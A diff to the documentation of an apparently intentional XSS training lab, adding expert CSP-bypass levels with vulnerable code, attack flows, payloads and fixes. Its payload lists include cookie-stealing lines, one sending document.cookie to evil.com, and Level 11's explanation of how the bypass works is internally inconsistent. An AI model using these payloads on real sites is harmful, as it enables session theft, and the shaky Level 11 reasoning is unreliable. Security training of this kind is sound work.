@@ -539,19 +539,50 @@ if not re.match(r'^[a-zA-Z_$][a-zA-Z0-9_$]*$', callback):
     callback = 'callback'
 ```
 
-### Level 11: Entity Decoder (Double Decode) 🟡 Medium
+### Level 11: CSP Eval Gate (unsafe-eval Bypass) 🔴 Expert
 
-**URL**: `http://localhost/level11?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E`
+**URL**: `http://localhost/level11?q=\';alert(1);//`
 
-**Vulnerability Type**: Reflected XSS (entity decode mistake)
+**Vulnerability Type**: CSP Bypass via `unsafe-eval`
 
-**How it Works**: Input is escaped, then immediately unescaped and rendered as HTML.
+**CSP Policy**: `script-src 'self' 'unsafe-eval';`
+
+**How it Works**:
+```python
+# Server escapes single quotes only
+safe_query = query.replace("'", "\\'")
+# CSP header set via HTTP response
+resp.headers["Content-Security-Policy"] = "script-src 'self' 'unsafe-eval';"
+```
+
+```javascript
+// Template: user input inside JS string
+var input = '{{ query|safe }}';
+```
+
+**CSP Analysis**:
+- Blocks inline `<script>` tags and event handlers (`onerror`, `onclick`, etc.)
+- Allows `eval()`, `Function()`, `setTimeout(string)` via `unsafe-eval`
+- Single-quote escaping (`'` → `\'`) can be bypassed with backslash
+
+**Attack Flow**:
+1. Input: `\';alert(1);//`
+2. After escape: `\\';alert(1);//` → the `\'` becomes `\\'` (literal backslash)
+3. JavaScript: `var input = '\\';alert(1);//'`
+4. String closes after `\\`, `alert(1)` executes (allowed by `unsafe-eval`)
 
 **Successful Payloads**:
-- `<img src=x onerror=alert(1)>`
-- `<svg onload=alert(1)>`
+- `\';alert(1);//`
+- `\'+alert(1)+\'`
+- `\';Function('alert(1)')()//'`
 
-**Remediation**: Never unescape already-escaped output before rendering.
+**Remediation**:
+```python
+# 1. Remove 'unsafe-eval' from CSP
+# 2. Use JSON encoding for JS contexts
+import json
+safe_query = json.dumps(query)  # Proper string escaping
+```
 
 ---
 
@@ -571,15 +602,50 @@ if not re.match(r'^[a-zA-Z_$][a-zA-Z0-9_$]*$', callback):
 
 ---
 
-### Level 13: DOM Stream (insertAdjacentHTML) 🟡 Medium
+### Level 13: CSP Nonce Vault (Predictable Nonce Bypass) 🔴 Expert
 
-**URL**: `http://localhost/level13?msg=<img src=x onerror=alert(1)>`
+**URL**: `http://localhost/level13?q=<script nonce="8f4e2a1b">alert(1)</script>`
 
-**Vulnerability Type**: DOM-based XSS
+**Vulnerability Type**: CSP Bypass via Leaked/Predictable Nonce
 
-**How it Works**: Query parameter is inserted directly into the DOM as HTML.
+**CSP Policy**: `script-src 'nonce-8f4e2a1b';`
 
-**Remediation**: Use `textContent` or sanitize before insertion.
+**How it Works**:
+```python
+# Server uses a hardcoded nonce (simulating a predictable/leaked nonce)
+nonce = "8f4e2a1b"
+resp.headers["Content-Security-Policy"] = f"script-src 'nonce-{nonce}';"
+```
+
+```html
+<!-- Nonce leaked in HTML comment and data attribute -->
+<!-- Debug: nonce=8f4e2a1b -->
+<input name="q" ... data-nonce="8f4e2a1b">
+<div>{{ query|safe }}</div>
+```
+
+**CSP Analysis**:
+- Blocks all scripts without the correct `nonce` attribute
+- Nonce is leaked in two places: an HTML comment and a `data-nonce` attribute
+- Attacker extracts nonce from page source and uses it in injected script tag
+
+**Attack Flow**:
+1. Attacker views page source → finds `nonce=8f4e2a1b`
+2. Crafts payload: `<script nonce="8f4e2a1b">alert(1)</script>`
+3. CSP allows the script because nonce matches
+
+**Successful Payloads**:
+- `<script nonce="8f4e2a1b">alert(1)</script>`
+- `<script nonce="8f4e2a1b">fetch('/steal?c='+document.cookie)</script>`
+
+**Remediation**:
+```python
+import secrets
+# 1. Generate a cryptographically random nonce per request
+nonce = secrets.token_hex(16)
+# 2. Never expose nonce in comments, attributes, or page content
+# 3. Only use nonce in <script nonce="..."> tags
+```
 
 ---
 
@@ -619,27 +685,113 @@ if not re.match(r'^[a-zA-Z_$][a-zA-Z0-9_$]*$', callback):
 
 ---
 
-### Level 17: Embedded Doc (srcdoc) 🟠 Hard
+### Level 17: CSP CDN Gateway (AngularJS CSTI Bypass) 🔴 Expert
 
-**URL**: `http://localhost/level17?doc=<img src=x onerror=alert(1)>`
+**URL**: `http://localhost/level17?q=<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>`
 
-**Vulnerability Type**: Reflected XSS in iframe srcdoc
+**Vulnerability Type**: CSP Bypass via Whitelisted CDN + AngularJS CSTI
 
-**How it Works**: Script filtering only removes `<script>` tags, allowing event handlers.
+**CSP Policy**: `script-src 'self' https://cdnjs.cloudflare.com;`
 
-**Remediation**: Escape or sanitize srcdoc content.
+**How it Works**:
+```python
+# CSP whitelists a CDN that hosts exploitable libraries
+resp.headers["Content-Security-Policy"] = "script-src 'self' https://cdnjs.cloudflare.com;"
+```
+
+```html
+<!-- Template: user input reflected as raw HTML -->
+<div>{{ query|safe }}</div>
+<!-- AngularJS loaded from whitelisted CDN -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>
+```
+
+**CSP Analysis**:
+- Blocks inline scripts and event handlers
+- Allows scripts from `'self'` and `https://cdnjs.cloudflare.com`
+- AngularJS (from CDN) processes `{{...}}` expressions as templates
+- `ng-csp` directive tells Angular to use CSP-compatible evaluation
+
+**Attack Flow**:
+1. CSP blocks `<script>alert(1)</script>` (inline)
+2. Attacker injects AngularJS template: `<div ng-app ng-csp>{{...}}</div>`
+3. AngularJS bootstraps on the injected `ng-app` element
+4. Template expression `$eval.constructor('alert(1)')()` creates and calls a `Function`
+5. JavaScript executes through AngularJS sandbox escape
+
+**Successful Payloads**:
+- `<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>`
+- `<div ng-app ng-csp><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></div>`
+
+**Remediation**:
+```python
+# 1. Don't whitelist entire CDN domains — use specific file hashes
+# script-src 'self' 'sha256-<hash_of_specific_script>';
+
+# 2. Use Subresource Integrity (SRI) for CDN scripts
+# <script src="https://cdn.../angular.min.js"
+#         integrity="sha384-..."
+#         crossorigin="anonymous"></script>
+
+# 3. Avoid whitelisting CDNs that host user-controllable JSONP or template engines
+```
 
 ---
 
-### Level 18: Eval Console 🟡 Medium
+### Level 18: CSP Dynamic Loader (strict-dynamic Bypass) 🔴 Expert
 
-**URL**: `http://localhost/level18?calc=alert(1)`
+**URL**: `http://localhost/level18?cb=alert(1);//`
 
-**Vulnerability Type**: DOM-based XSS (eval)
+**Vulnerability Type**: CSP Bypass via `strict-dynamic` Trusted Script Gadget
 
-**How it Works**: User input is executed by `eval()` on the client side.
+**CSP Policy**: `script-src 'nonce-<random>' 'strict-dynamic';`
 
-**Remediation**: Remove `eval` and use safe parsers.
+**How it Works**:
+```python
+# Random nonce per request + strict-dynamic
+nonce = secrets.token_hex(8)
+resp.headers["Content-Security-Policy"] = f"script-src 'nonce-{nonce}' 'strict-dynamic';"
+```
+
+```javascript
+// Trusted (nonced) script creates a dynamic script from user input
+<script nonce="{{ nonce }}">
+    var cb = "{{ callback|safe }}";
+    var s = document.createElement('script');
+    s.textContent = cb + '({"status":"ok"})';
+    document.body.appendChild(s);  // strict-dynamic: inherits trust
+</script>
+```
+
+**CSP Analysis**:
+- `strict-dynamic` means scripts created by trusted scripts inherit trust
+- The nonced parent script creates a child `<script>` via `createElement`
+- The child script's `textContent` includes user-controlled `cb` parameter
+- The child script executes because it was created by a trusted parent
+
+**Attack Flow**:
+1. Input: `alert(1);//`
+2. Trusted script creates: `s.textContent = 'alert(1);//({"status":"ok"})'`
+3. Dynamic script appended to DOM — trusted via `strict-dynamic`
+4. `alert(1)` executes, rest is commented out
+
+**Successful Payloads**:
+- `alert(1);//`
+- `fetch('/steal?c='+document.cookie);//`
+- `document.location='http://evil.com/?'+document.cookie;//`
+
+**Remediation**:
+```python
+# 1. Never inject user input into dynamically created script content
+# 2. Validate callback names against an allowlist
+import re
+if not re.match(r'^[a-zA-Z_$][a-zA-Z0-9_$]*$', callback):
+    callback = 'handleData'
+
+# 3. Use a data attribute instead of inline string
+# <div data-callback="{{ callback|e }}">
+# Then read it safely: el.dataset.callback
+```
 
 ---
 
